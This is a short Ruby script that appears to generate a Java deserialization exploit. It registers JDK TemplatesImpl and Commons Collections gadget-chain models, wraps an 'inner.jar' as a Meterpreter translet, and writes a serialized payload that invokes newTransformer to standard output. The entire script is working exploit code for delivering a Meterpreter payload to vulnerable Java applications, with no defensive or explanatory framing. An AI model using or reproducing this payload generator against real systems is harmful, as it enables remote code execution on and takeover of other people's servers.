require_relative 'payloads/templates'
require_relative 'payloads/collections'
require_relative 'loader'

# register the right model files
reg = Java::Serialize::Registry.new
reg.load('model/base-java9.json')
reg.load('model/jdk-templates.json')
# reg.load("model/xalan-templates.json")

reg.load('model/collections-3.json')
reg.load('model/collections-4.json')


tpl = Java::Meterpreter::translet(File.binread("inner.jar"))
oos = Java::Serialize::ObjectOutputStream.new(STDOUT, reg)
oos.writeObject(Java::Serialize::Payloads::Collections.make_invoke_noarg(tpl, "newTransformer",version=4))

